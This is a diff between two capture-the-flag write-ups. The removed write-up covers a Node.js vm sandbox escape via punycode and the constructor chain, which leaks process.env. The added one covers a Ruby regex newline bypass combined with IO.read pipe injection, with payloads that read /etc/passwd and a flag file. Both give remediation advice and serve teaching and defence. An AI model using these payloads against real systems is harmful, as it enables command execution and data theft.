@@ -1,187 +1,95 @@
 ## Description
-The node:vm module provides an environment for executing code within an isolated context, allowing developers to define a restricted set of global variables. However, due to JavaScript's prototype inheritance, an attacker can escape this sandbox by leveraging the constructor property of objects. By accessing `this.constructor.constructor`, which ultimately resolves to the global Function constructor, an attacker can execute arbitrary code outside the intended sandbox, potentially leaking sensitive data from the main process.
+This challenge revolves around a Ruby Web Application that allows users to supply an input to navigate to a corresponding page (i.e., login, collection). However, due to inadequate validation and sanitisation of user input, a malicious attacker may supply a specially crafted input to execute commands on the web server. This is primarily due to quirks related to regular expressions in Ruby, where the use of `^` and `$` matches the start and end of a line, rather than the entire string. As a results, an attacker can bypass a regular expression simply by supplying a line feed (`\n`) followed by a line that matches the expected pattern, thereby passing validation.
 
 ## Exploitation
-To identify potential vulnerabilities within an application, analyzing the source code can be an effective approach. Reviewing the implementation may reveal insecure coding practices, such as improper input validation or the use of dangerous functions. Additionally, taint analysis can help track how user-controlled input flows through the application, potentially reaching vulnerable sink functions that execute arbitrary code or access restricted data. In the context of this web application, understanding how untrusted input is processed and submitted into the sandbox. This can expose opportunities for escaping it and executing code in the broader application context.
-
+To identify potential vulnerabilities within an application,  analysing the source code is an effective approach as it reveals insecure coding practices, such as improper input validation or the misuse of certain libraries. In this scenario, we are presented with a web application that accepts a user input, which is then parsed by the program - potentially influencing the contents returned to the user.
 
 ### Code Analysis
-```javascript
-async function main() {
-    await Init_db();
+The first step in performing our taint tracking is to examine how our input is being handled by the program. In this scenario, a Web Application Firewall URL-encodes the user input before it reaches the web server.
 
-    // User input
-    var website = decodeURIComponent("");
-    var sourcecode = decodeURIComponent("");
+```ruby
+filename = CGI.unescape("<USER_INPUT>")
+content = ""
 
-    if ( website.length == 0 ) {
-        return {website, message:null}
-    }
-
-    try {
-        // Check if website is available
-        const isAvailable = await WebsiteIsAvailable(website)
-        if ( !isAvailable ) {
-            return {website, err:Error("This site has already been purchased by another user!")}
-        }
-        website = punycode.toUnicode(website)
-        await BuyWebsite(website)
-
-    } catch {
-        return {website, err:Error("Invalid website given!")}
-    }
+if validateFile(filename)
+    begin
+        content = IO.read("#{filename}.erb")
+    rescue
+        content = IO.read("collection.erb")
+    end
     
-    // Update the website for the client
-    const websites = await GetAllWebsites()
-    for ( let i = 0; i < websites.length; i++ ) {
-        let wsite = websites[i].website
-        if ( website == wsite ) {
-            UpdateWebsiteContent(wsite, sourcecode)
-            break
-        }
-    }
-
-    // Verify the source code in a sandbox environment
-    try {
-        vm.runInContext(
-            (await GetWebsiteCode("dójó-yeswehack.com")),
-            vm.createContext({})
-        );
-    // Notify our infra in case we got an error
-    } catch(err) {
-        NotifyInfra(err)
-        return {website, err:Error("Our code is broken!")}
-    }
-
-    return {website, message:"Nice catch - You're all set!"}
-}
+end
 ```
 
-From the main function, we can get a general understanding of how our inputs are processed. When we click on the "Submit" button, our `website` input is passed to the `WebsiteIsAvailable` function.  The `website` input is then converted from Punycode* to Unicode if the function returns a truthy value. 
+The user input (denoted by `<USER_INPUT>`) is first decoded using the `CGI.unescape()` function, which returns it to its original form before being passed to the `validateFile()` function. Either the `validateFile()` function must return a truthy value, or the input must be empty, for the `content` variable to be populated.
 
-Afterwards, the converted input is used by the `BuyWebsite` function, followed by the `UpdateWebsiteContent` function, which also takes in our `sourcecode` input. This `sourcecode` input is vital as it is what is returned by the `GetWebsiteCode` function later on, which will then be fed into a Node.js VM. However, an important observation can be made here, that is, the `GetWebsiteCode` function is explicitly searching for the code tied to `dójó-yeswehack.com`. This is an indicator that we should our `website` input should somehow resolve to the same string.
-
-Let us now take a closer look at the function implementations.
-
-\* *Punycode is a special encoding used to represent Unicode characters using the limited ASCII character subset.* 
-
-**WebsiteIsAvailable(website)**
-
-```javascript
-async function WebsiteIsAvailable(website) {
-    return new Promise((resolve, reject) => {
-        const stmt = db.prepare(`SELECT website FROM websites WHERE website = ?`);
-        stmt.all([website], 
-            (err, rows) => err ? reject(err) : resolve( rows.length == 0 )
-        );
-    });
-}
+```ruby
+def validateFile(filename)
+    return !!/^[a-zA-Z0-9_-]+$/.match(filename) || filename.length == 0
+end
 ```
 
-From this function, we can determine that in order for the function to return a truthy value, our `website` input must be a unique entry in their database.
+The `validateFile()` function performs a regular expression matching using the pattern `/^[a-zA-Z0-9_-]+$/` to ensure that the input should only contain alphanumeric characters, underscores (`_`), and dashes (`-`). The double exclamation marks `!!` apply logical negation twice to the result of the regular expression's match, casting the output to a boolean value.
 
-**BuyWebsite(website), UpdateWebsiteContent(website, code), GetWebsiteCode(website)**
-
-```javascript
-async function BuyWebsite(website) {
-    return new Promise((resolve, reject) => {
-        const stmt = db.prepare(`INSERT INTO websites(website) VALUES(?)`);
-        stmt.run([website],
-            (err) => err ? reject(err) : resolve()
-        );
-    });
-}
-
-async function UpdateWebsiteContent(website, code) {
-    return new Promise((resolve, reject) => {
-        const stmt = db.prepare(`UPDATE websites SET code = ? WHERE website = ?`);
-        stmt.run([code, website],
-            (err) => err ? reject(err) : resolve()
-        );
-    });
-}
-
-async function GetWebsiteCode(website) {
-     return new Promise((resolve, reject) => {
-        const stmt = db.prepare(`SELECT code FROM websites WHERE website = ? LIMIT 1`);
-        stmt.get([website], 
-            (err, rows) => err ? reject(err) : resolve(rows.code)
-        );
-    });
-}
+```ruby
+puts ERB.new(IO.read("index.erb")).result_with_hash({page: content})
 ```
 
-These functions adds our `website` input into the database, updates JavaScript code to be executed within the Node.js VM associated with the added website stored within our `sourcecode` input, and retrieves the code respectively.
+After the user input is validated, the core template file `index.erb`, injects the contents of a `.erb` template file, whose name corresponds to the value stored in the `content` variable.
 
-### Planning the Attack
+### Conclusions drawn from Code Analysis
+While the user input validation function `validateFile()` seems secure at first glance, it overlooks how the regular expression is actually matched in Ruby. `^` and `$` matches the start and end of a **line**, not the entire input string. To match the entire string, `\A` and `/z` should be used instead. 
 
-So what is our goal here? Ideally, it would be to make it all the way to the line in main:
+This oversight means that an attacker can bypass the validation by submitting a multi-line input such as:
 
-```javascript
-return {website, message:"Nice catch - You're all set!"}
+```
+this_input_does_not_satisfy_the_pattern$#@!
+abc
 ```
 
-and attempt to leak out the environment variables. In JavaScript, we typically read environment variables by accessing `process.env`.
+Although the first line (`this_input_does_not_satisfy_the_pattern$#@!`) fails validation due to the illegal characters (`$#@!`), the second line (`abc`) passes. As a result, the `validateFile()` function returns a truthy value, tricking the program into accepting the user input as valid and allowing its contents to be parsed.
 
-But what should our input variables be? We have previously concluded that our `website` input should resolve to `dójó-yeswehack.com`, however, simply inputting the string as it is will return us an error:
+{YWH-R585170}
 
-![Site Already Purchased](./site_already_purchased.png)
+In the image above, the user input passed validation but since the template file `this_input_does_not_satisfy_the_pattern$#@!\nabc.erb` does not exist, `collection.erb` was returned instead.
 
-If we review the source code and look at how the database is initalised, we can observe that the entry already exists prior to our submission:
+Another point of interest for attackers would be the
 
-```javascript
-async function Init_db() {
-    return new Promise((resolve, reject) => {
-        db.exec(`
-            CREATE TABLE IF NOT EXISTS websites (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                website TEXT NOT NULL,
-                code TEXT
-            );
-            INSERT INTO websites (website, code) VALUES
-                ('dójó-yeswehack.com', '// Code in dev'),
-                ('dojo-yeswehack.com', '// Code in dev')
-        `, (err) => err ? reject(err) : resolve());
-    });
-}
+```ruby
+IO.read("#{filename}.erb")
 ```
 
-Therefore, we need our `website` input to fulfill the following conditions:
-1. be unique to the database when it is passed as an argument to the `WebsiteIsAvailable` function
-2. resolve to `dójó-yeswehack.com` when it is passed to the `BuyWebsite` function
+function called after input validation passes. With the `IO.read()` function, an attacker can force the web server to run Operating System commands by passing the string value `| <OS_COMMAND>` where `<OS_COMMAD>` is to be replaced with the commands an attacker wishes the web server to run (e.g. `ls -al`).
 
-With punycode, this can be made possible. By leveraging a Unicode to Punycode converter, we can determine that our input should be: `xn--dj-yeswehack-0hbb.com`. The string "xn--dj-yeswehack-0hbb.com" is a unique entry to the database when fulfilling our first condition, and after being converted from Punycode back to Unicode prior to the execution of the `BuyWebsite` function, it is transformed back to "dójó-yeswehack.com", fulfilling our second condition.
+Combining the two observations together, the attacker will be able to read the `/etc/passwd` file by supplying the following input:
 
-Now that we know what our `website` input should be, we need to figure out a payload for the `sourcecode` input. When the Node.js VM is run, it is provided an empty context `{}`, and we somehow need to leak the caller's environment variable into the VM.
-
-In JavaScript, every object has a constructor, and that constructor has its own constructor, which is the global Function constructor. The global Function constructor can be used to create a function instance using a string input as the function body, similar to eval().
-
-```javascript
-console.log(({}).constructor); // [Function: Object]
-console.log(({}).constructor.constructor); // [Function: Function]
-console.log(({}).constructor.constructor("return 1+1")()); // 2
+```
+| cat /etc/passwd
+abc
 ```
 
-Going back to the source code, we can observe that we are not really able to manipulate the contents of the `message` nor `err` variables since they are hardcoded to *"Nice catch - You're all set!"* and *"Our code is broken!"* respectively, hence we have to try alternate methods of displaying the contents of the environment variables.
+{YWH-R585176}
 
-## PoC
-Now, piecing together all the information, we know that our `website` input should be `xn--dj-yeswehack-0hbb.com` and we have a way to access the global context outside the Node.js VM. We can attempt to console.log out the environment variables by supplying the `sourcecode` input with the string `(this.constructor.constructor("console.log(process.env)"))()`. The environment variables, containing our FLAG, were then exposed.
+## Proof of Concept
+The Proof of Concept (Poc) involves combining the observations derived from the previous section to perform a Remote Code Execution (RCE) and read the flag file stored on the web server.
 
-![Environment Variables Exposed](./environment_variables_exposed.png)
+{YWH-R585179}
 
-**FLAG: `FLAG{Y0u_ju5t_h4v3_t0_dive_d33p}`**
+**PAYLOAD: **
+```
+| cat /tmp/flag_*.txt
+abc
+```
+
+**FLAG: `FLAG{Ruby_C4n_B3_W31rd_R1gh7?!}`**
 
 ## Risk
-An attacker could expose environment variables, code variables and more, which could hold sensitive information such as API keys.
+This vulnerability presents a serious risk as it allows an attacker to execute arbitrary commands on the web server. As a result, the attacker is capable of:
+1. Reading files **(confidentiality compromised)**
+2. Writing/Overwriting files **(integrity compromised)**
+3. Deleting Files **(availability compromised)**
 
 ## Remediation
-The following steps could be taken to mitigate/eradicate the vulnerabilities:
-- convert the Punycode `website` input to Unicode prior to calling the `WebsiteIsAvailable` function to ensure that website availability is implemented properly
-- sanitise the `sourcecode` input to prevent accessing the global constructor, the primary flaw of the current system leading to arbitrary code execution outside of the Node.js VM's context
+To remediate the vulnerability, the regular expression should be changed from `/^[a-zA-Z0-9_-]+$/` to `/\A[a-zA-Z0-9_-]+\z/` to match the entire user input string.
 
-It is worth mentioning that the node:vm module's documentation explicitly mentions the following:
-> "The node:vm module is not a security mechanism. Do not use it to run untrusted code."
-
-Thus, greater emphasis should be placed on the sanitisation of the `sourcecode` input.
-
-![Challenge Completed](./pwned.jpeg)
+Additionally, a whitelist/blacklist of allowed/disalllowed words can be used to ensure that user input is further restricted.
